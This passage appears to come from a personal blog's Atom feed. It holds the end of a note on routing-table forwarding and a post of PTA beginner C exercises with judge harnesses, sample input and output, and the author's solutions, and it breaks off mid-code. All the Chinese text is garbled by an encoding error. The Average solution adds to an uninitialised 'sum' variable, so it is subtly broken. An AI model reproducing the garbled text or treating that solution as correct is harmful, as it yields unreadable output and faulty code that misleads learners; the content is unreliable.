id="æ£€æµ‹è·¯ç”±è¡¨ä¸­æœ‰æ— è·¯å¾„"><a href="#æ£€æµ‹è·¯ç”±è¡¨ä¸­æœ‰æ— è·¯å¾„" class="headerlink" title="æ£€æµ‹è·¯ç”±è¡¨ä¸­æœ‰æ— è·¯å¾„"></a>æ£€æµ‹è·¯ç”±è¡¨ä¸­æœ‰æ— è·¯å¾„</h2><p>å¯¹è·¯ç”±è¡¨ä¸­æ¯ä¸€è¡Œçš„å­ç½‘æ©ç å’ŒDè¿›è¡Œä¸è¿ç®—ï¼Œè‹¥ç»“æœä¸è¯¥è¡Œçš„ç›®çš„ç½‘ç»œåœ°å€åŒ¹é…ï¼Œåˆ™å°†åˆ†ç»„ä¼ ç»™è¯¥è¡ŒæŒ‡æ˜çš„ä¸‹ä¸€è·³è·¯ç”±å™¨ã€‚å¦åˆ™æ‰§è¡Œä¸‹ä¸€æ­¥</p><h2 id="é»˜è®¤è·¯ç”±-0-0-0-0"><a href="#é»˜è®¤è·¯ç”±-0-0-0-0" class="headerlink" title="é»˜è®¤è·¯ç”± 0.0.0.0"></a>é»˜è®¤è·¯ç”± 0.0.0.0</h2><p>è‹¥è·¯ç”±è¡¨ä¸­æœ‰ä¸€ä¸ªé»˜è®¤è·¯ç”±ï¼Œåˆ™å°†åˆ†ç»„ä¼ ç»™è·¯ç”±è¡¨ä¸­æŒ‡æ˜çš„é»˜è®¤è·¯ç”±å™¨ã€‚<br>å¦åˆ™æ‰§è¡Œæœ€åä¸€æ­¥</p><h2 id="ä¸¢å¼ƒ"><a href="#ä¸¢å¼ƒ" class="headerlink" title="ä¸¢å¼ƒ"></a>ä¸¢å¼ƒ</h2><p>æŠ¥å‘Šè½¬å‘åˆ†ç»„å‡ºé”™</p>]]></content>
    
    <summary type="html">
    
      å†™ç‚¹è®¡ç½‘çš„å­¦ä¹ ç¬”è®°
    
    </summary>
    
    
      <category term="çæ‰¯" scheme="https://manayakko.github.io/yakko117/categories/%E7%9E%8E%E6%89%AF/"/>
    
    
      <category term="çæ‰¯" scheme="https://manayakko.github.io/yakko117/tags/%E7%9E%8E%E6%89%AF/"/>
    
  </entry>
  
  <entry>
    <title>PTA aé¢˜</title>
    <link href="https://manayakko.github.io/yakko117/2020/03/02/PTAbasic/"/>
    <id>https://manayakko.github.io/yakko117/2020/03/02/PTAbasic/</id>
    <published>2020-03-02T10:12:34.420Z</published>
    <updated>2020-03-02T13:28:06.234Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>ç®—æ³•åŸç†è¦èŠ±æ—¶é—´å¥½å¥½æ‘¸ä¸€ä¸‹ï¼Œæ¨èä¸€ä¸ªå¤§ä½¬çš„æ•°æ®ç»“æ„ç®—æ³•è¯¦è§£<br><a href="https://github.com/labuladong/fucking-algorithm" target="_blank" rel="noopener">æ‰‹æŠŠæ‰‹æ’•LeetCodeé¢˜ç›®ï¼Œæ‰’å„ç§ç®—æ³•å¥—è·¯çš„è£¤å­</a></p><a id="more"></a><h1 id="åŸºç¡€ç¼–ç¨‹é¢˜ç›®é›†"><a href="#åŸºç¡€ç¼–ç¨‹é¢˜ç›®é›†" class="headerlink" title="åŸºç¡€ç¼–ç¨‹é¢˜ç›®é›†"></a>åŸºç¡€ç¼–ç¨‹é¢˜ç›®é›†</h1><h2 id="6-1-ç®€å•è¾“å‡ºæ•´æ•°-10åˆ†"><a href="#6-1-ç®€å•è¾“å‡ºæ•´æ•°-10åˆ†" class="headerlink" title="6-1 ç®€å•è¾“å‡ºæ•´æ•° (10åˆ†)"></a>6-1 ç®€å•è¾“å‡ºæ•´æ•° (10åˆ†)</h2><p>æœ¬é¢˜è¦æ±‚å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œå¯¹ç»™å®šçš„æ­£æ•´æ•° <code>N</code>ï¼Œæ‰“å°ä»1åˆ°Nçš„å…¨éƒ¨æ­£æ•´æ•°ã€‚<br>å‡½æ•°æ¥å£å®šä¹‰ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintN</span> <span class="params">( <span class="keyword">int</span> N )</span></span>;</span><br></pre></td></tr></table></figure></div><p>å…¶ä¸­Næ˜¯ç”¨æˆ·ä¼ å…¥çš„å‚æ•°ã€‚è¯¥å‡½æ•°å¿…é¡»å°†ä»1åˆ°Nçš„å…¨éƒ¨æ­£æ•´æ•°é¡ºåºæ‰“å°å‡ºæ¥ï¼Œæ¯ä¸ªæ•°å­—å 1è¡Œã€‚</p><h3 id="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"><a href="#è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š" class="headerlink" title="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"></a>è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintN</span> <span class="params">( <span class="keyword">int</span> N )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">    PrintN( N );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä½ çš„ä»£ç å°†è¢«åµŒåœ¨è¿™é‡Œ */</span></span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥æ ·ä¾‹ï¼š</span><br><span class="line">3</span><br><span class="line">è¾“å‡ºæ ·ä¾‹ï¼š</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure></div><h3 id="è§£ç­”"><a href="#è§£ç­”" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintN</span> <span class="params">( <span class="keyword">int</span> N )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">1</span>; i&lt;=N; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><h2 id="6-2-å¤šé¡¹å¼æ±‚å€¼-15åˆ†"><a href="#6-2-å¤šé¡¹å¼æ±‚å€¼-15åˆ†" class="headerlink" title="6-2 å¤šé¡¹å¼æ±‚å€¼ (15åˆ†)"></a>6-2 å¤šé¡¹å¼æ±‚å€¼ (15åˆ†)</h2><p>æœ¬é¢˜è¦æ±‚å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œè®¡ç®—é˜¶æ•°ä¸º <code>n</code>ï¼Œç³»æ•°ä¸º<code>a[0]</code> â€¦ <code>a[n]</code>çš„å¤šé¡¹å¼<br>$$f(x)=\sum_{i=0}^n(a[i]Ã—x^i<br>)$$åœ¨xç‚¹çš„å€¼ã€‚</p><p>å‡½æ•°æ¥å£å®šä¹‰ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">f</span><span class="params">( <span class="keyword">int</span> n, <span class="keyword">double</span> a[], <span class="keyword">double</span> x )</span></span>;</span><br></pre></td></tr></table></figure></div><p>å…¶ä¸­ <code>n</code> æ˜¯å¤šé¡¹å¼çš„é˜¶æ•°ï¼Œ<code>a[]</code> ä¸­å­˜å‚¨ç³»æ•°ï¼Œ<code>x</code> æ˜¯ç»™å®šç‚¹ã€‚å‡½æ•°é¡»è¿”å›å¤šé¡¹å¼ <code>f(x)</code> çš„å€¼ã€‚</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥æ ·ä¾‹ï¼š</span><br><span class="line">2 1.1</span><br><span class="line">1 2.5 -38.7</span><br><span class="line">è¾“å‡ºæ ·ä¾‹ï¼š</span><br><span class="line">-43.1</span><br></pre></td></tr></table></figure></div><h3 id="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-1"><a href="#è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-1" class="headerlink" title="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"></a>è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 10 <span class="comment">// å®šä¹‰æœ€å¤š10ä¸ªaé¡¹</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">f</span><span class="params">( <span class="keyword">int</span> n, <span class="keyword">double</span> a[], <span class="keyword">double</span> x )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, i;</span><br><span class="line">    <span class="keyword">double</span> a[MAXN], x;</span><br><span class="line">    <span class="comment">// double å°±æ˜¯æ¯” float ç²¾åº¦æ›´é«˜çš„æµ®ç‚¹æ•°è¡¨ç¤ºç±»å‹</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %lf"</span>, &amp;n, &amp;x);</span><br><span class="line">    <span class="comment">// %lf åŒç²¾åº¦æµ®ç‚¹å‹æ•°æ®çš„è¾“å…¥æ ¼å¼æ§åˆ¶ç¬¦</span></span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;=n; i++ )</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%lf"</span>, &amp;a[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%.1f\n"</span>, f(n, a, x));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä½ çš„ä»£ç å°†è¢«åµŒåœ¨è¿™é‡Œ */</span></span><br></pre></td></tr></table></figure></div><h3 id="è§£ç­”ï¼š"><a href="#è§£ç­”ï¼š" class="headerlink" title="è§£ç­”ï¼š"></a>è§£ç­”ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">f</span><span class="params">( <span class="keyword">int</span> n, <span class="keyword">double</span> a[], <span class="keyword">double</span> x )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> sum = a[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">double</span> res = <span class="number">1.0</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=n; ++i) &#123;</span><br><span class="line">        <span class="comment">/* </span></span><br><span class="line"><span class="comment">        int i = 3 ;</span></span><br><span class="line"><span class="comment">        a = i++; -&gt; a=3 -&gt; å…ˆè®©aå˜æˆiçš„å€¼ï¼Œå†è®©iåŠ 1</span></span><br><span class="line"><span class="comment">        b = ++i; -&gt; b=4 -&gt; å…ˆè®©iåŠ 1, å†è®©bå˜æˆiçš„å€¼</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        res *= x; <span class="comment">// res = x, x^2, x^3...  // res = res*x</span></span><br><span class="line">        sum += a[i] * res; <span class="comment">// sum = sum + a[i]*res</span></span><br><span class="line">        <span class="comment">/* </span></span><br><span class="line"><span class="comment">        printf("i=: %d", i);</span></span><br><span class="line"><span class="comment">        echo "i=1 / i=2"</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><h2 id="6-3-ç®€å•æ±‚å’Œ-10åˆ†"><a href="#6-3-ç®€å•æ±‚å’Œ-10åˆ†" class="headerlink" title="6-3 ç®€å•æ±‚å’Œ (10åˆ†)"></a>6-3 ç®€å•æ±‚å’Œ (10åˆ†)</h2><p>æœ¬é¢˜è¦æ±‚å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œæ±‚ç»™å®šçš„ <code>N</code> ä¸ªæ•´æ•°çš„å’Œã€‚<br>å‡½æ•°æ¥å£å®šä¹‰ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Sum</span> <span class="params">( <span class="keyword">int</span> List[], <span class="keyword">int</span> N )</span></span>;</span><br></pre></td></tr></table></figure></div><p>å…¶ä¸­ç»™å®šæ•´æ•°å­˜æ”¾åœ¨æ•°ç»„ <code>List[]</code> ä¸­ï¼Œæ­£æ•´æ•°Næ˜¯æ•°ç»„å…ƒç´ ä¸ªæ•°ã€‚è¯¥å‡½æ•°é¡»è¿”å›Nä¸ª <code>List[]</code> å…ƒç´ çš„å’Œã€‚</p><h3 id="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-2"><a href="#è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-2" class="headerlink" title="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"></a>è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 10</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Sum</span> <span class="params">( <span class="keyword">int</span> List[], <span class="keyword">int</span> N )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> List[MAXN], N, i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;N; i++ )</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;List[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, Sum(List, N));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä½ çš„ä»£ç å°†è¢«åµŒåœ¨è¿™é‡Œ */</span></span><br></pre></td></tr></table></figure></div><p>ç„¶åæ˜¯è¾“å…¥è¾“å‡ºæ ·å¼ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥</span><br><span class="line">3</span><br><span class="line">12 34 -5</span><br><span class="line">è¾“å‡º</span><br><span class="line">41</span><br></pre></td></tr></table></figure></div><h3 id="è§£ç­”-1"><a href="#è§£ç­”-1" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Sum</span> <span class="params">( <span class="keyword">int</span> List[], <span class="keyword">int</span> N )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> sum =<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;N; i++ ) &#123;</span><br><span class="line">        sum += List[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><h2 id="6-4-æ±‚è‡ªå®šç±»å‹å…ƒç´ çš„å¹³å‡-10åˆ†"><a href="#6-4-æ±‚è‡ªå®šç±»å‹å…ƒç´ çš„å¹³å‡-10åˆ†" class="headerlink" title="6-4 æ±‚è‡ªå®šç±»å‹å…ƒç´ çš„å¹³å‡ (10åˆ†)"></a>6-4 æ±‚è‡ªå®šç±»å‹å…ƒç´ çš„å¹³å‡ (10åˆ†)</h2><p>æœ¬é¢˜è¦æ±‚å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œæ±‚Nä¸ªé›†åˆå…ƒç´  <code>S[]</code> çš„å¹³å‡å€¼ï¼Œå…¶ä¸­é›†åˆå…ƒç´ çš„ç±»å‹ä¸ºè‡ªå®šä¹‰çš„ <code>ElementType</code>ã€‚<br>å‡½æ•°æ¥å£å®šä¹‰ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ElementType <span class="title">Average</span><span class="params">( ElementType S[], <span class="keyword">int</span> N )</span></span>;</span><br></pre></td></tr></table></figure></div><p>å…¶ä¸­ç»™å®šé›†åˆå…ƒç´ å­˜æ”¾åœ¨ <code>æ•°ç»„S[]</code>ä¸­ï¼Œæ­£æ•´æ•°Næ˜¯æ•°ç»„å…ƒç´ ä¸ªæ•°ã€‚è¯¥å‡½æ•°é¡»è¿”å›Nä¸ª <code>S[]</code>å…ƒç´ çš„å¹³å‡å€¼ï¼Œå…¶å€¼ä¹Ÿå¿…é¡»æ˜¯<code>ElementTypeç±»å‹</code>ã€‚</p><h3 id="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-3"><a href="#è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-3" class="headerlink" title="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"></a>è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">float</span> ElementType;</span><br><span class="line"></span><br><span class="line"><span class="function">ElementType <span class="title">Average</span><span class="params">( ElementType S[], <span class="keyword">int</span> N )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ElementType S[MAXN];</span><br><span class="line">    <span class="keyword">int</span> N, i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;N; i++ )</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%f"</span>, &amp;S[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%.2f\n"</span>, Average(S, N));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä½ çš„ä»£ç å°†è¢«åµŒåœ¨è¿™é‡Œ */</span></span><br></pre></td></tr></table></figure></div><p>ç„¶åæ˜¯è¾“å…¥è¾“å‡ºæ ·å¼ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥</span><br><span class="line">3</span><br><span class="line">12.3 34 -5</span><br><span class="line">è¾“å‡º</span><br><span class="line">13.77</span><br></pre></td></tr></table></figure></div><h3 id="è§£ç­”-2"><a href="#è§£ç­”-2" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ElementType <span class="title">Average</span><span class="params">( ElementType S[], <span class="keyword">int</span> N )</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    ElementType sum, average;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;N; i++) &#123;</span><br><span class="line">        sum += S[i];</span><br><span class="line">    &#125;</span><br><span class="line">    average = sum/N;</span><br><span class="line">    <span class="keyword">return</span> average;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><h2 id="6-5-æ±‚è‡ªå®šç±»å‹å…ƒç´ çš„æœ€å¤§å€¼-10åˆ†"><a href="#6-5-æ±‚è‡ªå®šç±»å‹å…ƒç´ çš„æœ€å¤§å€¼-10åˆ†" class="headerlink" title="6-5 æ±‚è‡ªå®šç±»å‹å…ƒç´ çš„æœ€å¤§å€¼ (10åˆ†)"></a>6-5 æ±‚è‡ªå®šç±»å‹å…ƒç´ çš„æœ€å¤§å€¼ (10åˆ†)</h2><p>æœ¬é¢˜è¦æ±‚å®ç°ä¸€ä¸ªå‡½æ•°ï¼Œæ±‚Nä¸ªé›†åˆå…ƒç´  <code>S[]</code> ä¸­çš„æœ€å¤§å€¼ï¼Œå…¶ä¸­é›†åˆå…ƒç´ çš„ç±»å‹ä¸ºè‡ªå®šä¹‰çš„ <code>ElementType</code>ã€‚</p><p>å‡½æ•°æ¥å£å®šä¹‰ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ElementType <span class="title">Max</span><span class="params">( ElementType S[], <span class="keyword">int</span> N )</span></span>;</span><br></pre></td></tr></table></figure></div><p>å…¶ä¸­ç»™å®šé›†åˆå…ƒç´ å­˜æ”¾åœ¨ <code>æ•°ç»„S[]</code> ä¸­ï¼Œæ­£æ•´æ•°Næ˜¯æ•°ç»„å…ƒç´ ä¸ªæ•°ã€‚è¯¥å‡½æ•°é¡»è¿”å›Nä¸ª<code>S[]å…ƒç´ ä¸­çš„æœ€å¤§å€¼</code>ï¼Œå…¶å€¼ä¹Ÿå¿…é¡»æ˜¯ <code>ElementTypeç±»å‹</code>ã€‚</p><h3 id="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-4"><a href="#è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š-4" class="headerlink" title="è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š"></a>è£åˆ¤æµ‹è¯•ç¨‹åºæ ·ä¾‹ï¼š</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span 